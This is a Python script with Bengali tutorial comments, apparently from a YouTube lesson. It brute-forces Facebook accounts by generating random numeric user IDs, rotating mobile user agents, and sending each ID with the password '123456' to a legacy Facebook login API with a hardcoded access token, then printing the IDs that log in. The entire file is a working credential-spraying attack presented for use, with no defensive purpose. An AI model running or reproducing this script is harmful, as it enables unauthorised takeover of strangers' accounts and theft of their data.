
import os,sys,time,random
import requests,json
from datetime import datetime as d
from termcolor import colored


# এখন আমরা, কোড স্টাইলিশ করে ডিজাইন করব।


def banner():
	os.system("clear")
	b=colored("""
  █████▒▄▄▄       ▄████▄  ▓█████  ▄▄▄▄    ▒█████   ▒█████   ██ ▄█▀
▓██   ▒▒████▄    ▒██▀ ▀█  ▓█   ▀ ▓█████▄ ▒██▒  ██▒▒██▒  ██▒ ██▄█▒ 
▒████ ░▒██  ▀█▄  ▒▓█    ▄ ▒███   ▒██▒ ▄██▒██░  ██▒▒██░  ██▒▓███▄░ 
░▓█▒  ░░██▄▄▄▄██ ▒▓▓▄ ▄██▒▒▓█  ▄ ▒██░█▀  ▒██   ██░▒██   ██░▓██ █▄ 
░▒█░    ▓█   ▓██▒▒ ▓███▀ ░░▒████▒░▓█  ▀█▓░ ████▓▒░░ ████▓▒░▒██▒ █▄
 ▒ ░    ▒▒   ▓▒█░░ ░▒ ▒  ░░░ ▒░ ░░▒▓███▀▒░ ▒░▒░▒░ ░ ▒░▒░▒░ ▒ ▒▒ ▓▒
 ░       ▒   ▒▒ ░  ░  ▒    ░ ░  ░▒░▒   ░   ░ ▒ ▒░   ░ ▒ ▒░ ░ ░▒ ▒░
 ░ ░     ░   ▒   ░           ░    ░    ░ ░ ░ ░ ▒  ░ ░ ░ ▒  ░ ░░ ░ 
             ░  ░░ ░         ░  ░ ░          ░ ░      ░ ░  ░  ░   
                 ░                     ░                          
______Author___ : Md Josif Khan
_____Coded By__ : Md Josif Khan
____GitHub_____ : Md Josif Khan
___YouTube_____ : Md Josif Khan
__Facebook_____ : Md Josif Khan
____________________________________________________________________

""","red")
	print(b)

# এখন একাধিক ইউজার এজেন্ট লাগানো দেখাই দিব 


useragent=['Mozilla/5.0 (Linux; Android 8.1.0; V1818A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36','Mozilla/5.0 (Linux; arm_64; Android 8.1.0; CPH1903) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 YaApp_Android/21.111.1 YaSearchBrowser/21.111.1 BroPP/1.0 SA/3 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.1.0; LM-Q710(FGN) Build/OPM1.171019.019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36 GoogleApp/12.44.23.23.arm',"Mozilla/5.0 (Linux; Android 8.1.0; vivo 1812 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/7.9.0.1"]
password="123456"


def function():
	banner()
	for _ in range(100000): # range barai dile scaning limit barbe
		ua=random.choice(useragent)
		try:

			uid = random.randint(100000010000000,100000099999999) #2009 ID Serial Number
			uid=str(uid)

			headers={'user-agent': ua}
			
			url='https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=en_US&password=' + password + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
			view=requests.get(url, headers=headers)
			result=json.loads(view.text)
			
			if "The phone" in str(result)or "The username" in str(result) or "The password" in str(result):
				print(colored(f"[{_}] {uid} != {password}","red"),'[Incorrect]')
				pass
			
			elif "Invalid username or password (401)" in str(result):
				#print(colored("Ip blocked,Turn off data connection or on airplane mode, to unblock your ip","yellow"))
				pass

			elif "www.facebook.com" in str(result):
				print(colored(f"[{_}] {uid} == {password} [Logged In]","green"))
				
			else:
				print(result)
				pass


		except requests.exceptions.ConnectionError:
			print("No Internet")
			sys.exit()
		except KeyboardInterrupt:
			print("cancelled")
			sys.exit()

function()





# next video te access key ba password 
# protection system jeita
# login kore active korte hoi oi system kora dekhabo,

# totokhon sobay pashei thakben :)






